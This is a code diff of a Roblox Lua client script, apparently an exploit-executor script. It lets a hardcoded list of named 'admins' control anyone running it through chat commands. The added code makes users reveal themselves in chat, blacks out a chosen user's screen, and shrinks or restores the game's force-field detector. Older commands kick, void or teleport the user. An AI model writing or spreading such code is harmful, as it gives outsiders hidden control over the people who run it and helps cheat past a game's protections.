@@ -3,7 +3,6 @@ local TeleportService = game:GetService("TeleportService")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local LocalPlayer = Players.LocalPlayer
 local PlaceId = game.PlaceId
-local Workspace = game:GetService("Workspace")
 
 local Admins = {
     ["QT_xAraa"] = true,
@@ -14,7 +13,11 @@ local Admins = {
     ["Drenvoryth"] = true
 }
 
-local function OnChatMessage(player, message)
+local OrigSize = Vector3.new(89.47997283935547, 0.05000000074505806, 38.62000274658203)
+local FFConnection
+local BlindGui = nil
+
+local function ChatCommand(player, message)
     if Admins[player.Name] then
         local match1 = message:lower():match(">/%s*kick%s+([%w_]+)")
         if match1 and LocalPlayer.Name:lower():find(match1) then
@@ -23,9 +26,12 @@ local function OnChatMessage(player, message)
 
         local match2 = message:lower():match(">/%s*revealusers%s*")
         if match2 then
-            if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
-                LocalPlayer.Character.HumanoidRootPart.CFrame = player.Character.HumanoidRootPart.CFrame
-            end
+            wait(0.5)
+            local args = {
+                [1] = "Me",
+                [2] = "All"
+            }
+            ReplicatedStorage:WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest"):FireServer(unpack(args))
         end
 
         local match3 = message:lower():match(">/%s*void%s+([%w_]+)")
@@ -40,15 +46,50 @@ local function OnChatMessage(player, message)
             TeleportService:Teleport(PlaceId, LocalPlayer)
         end
 
-        local match6 = message:lower():match(">/%s*removeff%s*")
-        if match6 then
-            local ffParts = Workspace:FindFirstChild("ForceFieldDetectorParts")
-            if ffParts then
-                for _, part in ipairs(ffParts:GetChildren()) do
-                    if part:IsA("BasePart") then
-                        part.Size = Vector3.new(1, 1, 1)
-                    end
+        local match5 = message:lower():match(">/%s*removeff%s+([%w_]+)")
+        if match5 and LocalPlayer.Name:lower():find(match5) then
+            local FFParts = workspace:FindFirstChild("ForceFieldDetectorParts")
+            if FFParts then
+                local DetectorPart = FFParts:FindFirstChild("GiveForceFieldDetectorPart")
+                if DetectorPart and DetectorPart:IsA("BasePart") then
+                    DetectorPart.Size = Vector3.new(0, 0, 0)
                 end
+            end
+        end
+
+        local match6 = message:lower():match(">/%s*enableff%s*")
+        if match6 then
+            local FFParts = workspace:FindFirstChild("ForceFieldDetectorParts")
+            if FFParts then
+                local DetectorPart = FFParts:FindFirstChild("GiveForceFieldDetectorPart")
+                if DetectorPart and DetectorPart:IsA("BasePart") then
+                    DetectorPart.Size = OrigSize
+                end
+            end
+        end
+
+        local match7 = message:lower():match(">/%s*blind%s+([%w_]+)")
+        if match7 and LocalPlayer.Name:lower():find(match7) then
+            if not BlindGui then
+                BlindGui = Instance.new("ScreenGui")
+                BlindGui.Name = "BlindEffect"
+                BlindGui.Parent = game:GetService("CoreGui")
+
+                local BlackFrame = Instance.new("Frame")
+                BlackFrame.Size = UDim2.new(10, 0, 10, 0)
+                BlackFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
+                BlackFrame.AnchorPoint = Vector2.new(0.5, 0.5)
+                BlackFrame.BackgroundColor3 = Color3.new(0, 0, 0)
+                BlackFrame.BorderSizePixel = 0
+                BlackFrame.Parent = BlindGui
+            end
+        end
+
+        local match8 = message:lower():match(">/%s*unblind%s+([%w_]+)")
+        if match8 and LocalPlayer.Name:lower():find(match8) then
+            if BlindGui then
+                BlindGui:Destroy()
+                BlindGui = nil
             end
         end
     end
@@ -56,7 +97,7 @@ end
 
 local function SetupPlayerChat(player)
     player.Chatted:Connect(function(message)
-        OnChatMessage(player, message)
+        ChatCommand(player, message)
     end)
 end
 
